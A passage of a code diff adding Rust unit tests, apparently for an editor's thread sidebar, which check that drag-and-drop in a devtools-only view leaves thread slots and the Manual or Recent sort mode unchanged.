+    drop_on(&sidebar, second, first, cx);
+
+    assert_eq!(
+        slots(&[editor, first, second], cx),
+        vec![Some(0), Some(1), Some(2)],
+        "a drop in the devtools-only view records nothing: the hidden thread keeps its slot"
+    );
+    assert_eq!(mode(cx), SortMode::Manual, "the mode is unchanged");
+    assert_eq!(visible_entries_as_strings(&sidebar, cx), before);
+}
+
+// R2.2: a Recent project shown through the devtools-only view stays Recent.
+#[gpui::test]
+async fn devtools_only_drop_leaves_a_recent_project_recent(cx: &mut TestAppContext) {
+    let (sidebar, cx) = alpha_window(cx).await;
+    let _editor = thread("s-editor", "Editor thread", 3, cx);
+    let first = thread("s-first", "First devtools", 2, cx);
+    let second = thread("s-second", "Second devtools", 1, cx);
+    mark_devtools(first, cx);
+    mark_devtools(second, cx);
+    devtools_only(&sidebar, cx);
+
+    drop_on(&sidebar, second, first, cx);
+
+    assert_eq!(mode(cx), SortMode::Recent, "nothing recorded");
+    assert_eq!(slots(&[first, second], cx), vec![None, None]);
+}
